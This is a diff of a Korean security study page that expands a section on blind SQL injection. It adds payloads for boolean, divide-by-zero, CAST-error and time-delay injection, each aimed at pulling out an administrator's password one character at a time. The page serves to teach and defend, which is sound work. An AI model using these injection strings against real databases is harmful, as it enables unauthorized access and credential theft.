@@ -75,7 +75,7 @@
 <ul>
 <li><a href=#예시>예시</a></li>
 <li><a href=#방어-2>방어</a></li>
-<li><a href=#sql-error>SQL Error</a></li>
+<li><a href=#blind-sql-injection>Blind SQL Injection</a></li>
 </ul>
 </li>
 <li><a href=#shellshock-attack>ShellShock Attack</a>
@@ -111,7 +111,7 @@
 </aside>
 <section class="mt-6 xl:w-5/6">
 <div class="flex flex-col">
-<h4 id=date>마지막 수정 : 2024-04-21</h4>
+<h4 id=date>마지막 수정 : 2024-04-22</h4>
 </div>
 <div class="mb-10 whitespace-nowrap">
 <div class="flex justify-between items-baseline my-4 gap-8">
@@ -408,14 +408,34 @@ protocol + hostname + port + path + query + fragment</p>
 <span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#75715e>// ss means &#34;string string&#34;
 </span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#75715e></span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bind_param</span>(<span style=color:#e6db74>&#34;ss&#34;</span>, $EID, $PASSWORD);
 <span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>();
-</code></pre></div><h3 id=sql-error>SQL Error</h3>
+</code></pre></div><h3 id=blind-sql-injection>Blind SQL Injection</h3>
 <blockquote>
-<p>의도적으로 SQL Error를 발생시키는 공격 기법</p>
+<p>SQL Injection 공격을 통해, DB에 대한 정보를 탈취하는 기법</p>
 </blockquote>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#66d9ef>CAST</span>((<span style=color:#66d9ef>SELECT</span> example_column <span style=color:#66d9ef>FROM</span> example_table) <span style=color:#66d9ef>as</span> int)
-<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#75715e>--&gt; ERROR: invalid input syntax for type integer: &#34;Example data&#34;
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#75715e></span><span style=color:#66d9ef>IF</span> (<span style=color:#66d9ef>SELECT</span> <span style=color:#66d9ef>COUNT</span>(USERNAME) <span style=color:#66d9ef>FROM</span> USERS <span style=color:#66d9ef>WHERE</span> USERNAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ADMINISTRATOR&#39;</span> <span style=color:#66d9ef>AND</span> <span style=color:#66d9ef>SUBSTRING</span>(PASSWORD, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&gt;</span> <span style=color:#e6db74>&#39;M&#39;</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span> WAITFOR DELAY <span style=color:#e6db74>&#39;0:0:{DELAY}&#39;</span><span style=color:#75715e>--
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span style=color:#75715e>--&gt; Time Delay 발생
+<ol>
+<li>Conditional Response</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Password의 첫번째 문자가 &#39;m&#39;보다 큰지 확인 */</span> 
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>xyz<span style=color:#e6db74>&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span>Administrator<span style=color:#e6db74>&#39;), 1, 1) &gt; &#39;</span>m
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#75715e>/* Password의 첫번째 문자가 &#39;t&#39;보다 큰지 확인 */</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>xyz<span style=color:#e6db74>&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span>Administrator<span style=color:#e6db74>&#39;), 1, 1) &gt; &#39;</span>t
+</code></pre></div><ol start=2>
+<li>SQL Error - Divide by Zero</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Password의 첫번째 문자가 &#39;m&#39;보다 크면 오류 발생 */</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>xyz<span style=color:#e6db74>&#39; AND (SELECT CASE WHEN (Username = &#39;</span>Administrator<span style=color:#e6db74>&#39; AND SUBSTRING(Password, 1, 1) &gt;
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#e6db74>&#39;</span>m<span style=color:#e6db74>&#39;) THEN 1/0 ELSE &#39;</span>a<span style=color:#e6db74>&#39; END FROM Users)=&#39;</span>a
+</code></pre></div><ol start=3>
+<li>SQL Error - Cast</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Password의 첫번째 문자가 &#39;m&#39;보다 크면 오류 발생 */</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#66d9ef>CAST</span>((<span style=color:#66d9ef>SELECT</span> example_column <span style=color:#66d9ef>FROM</span> example_table) <span style=color:#66d9ef>AS</span> int)
+</code></pre></div><ol start=4>
+<li>Time Delay</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Password의 첫번째 문자가 &#39;m&#39;보다 크면 딜레이 발생 */</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#e6db74>&#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#39;</span>Administrator<span style=color:#e6db74>&#39; AND
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#e6db74>SUBSTRING(Password, 1, 1) &gt; &#39;</span>m<span style=color:#e6db74>&#39;) = 1 WAITFOR DELAY &#39;</span><span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>0</span>:<span style=color:#960050;background-color:#1e0010>{</span>delay<span style=color:#960050;background-color:#1e0010>}</span><span style=color:#e6db74>&#39;-
 </span></code></pre></div><h2 id=shellshock-attack>ShellShock Attack</h2>
 <blockquote>
 <p>bash 쉘의 취약점을 이용하여, 공격하는 기법</p>
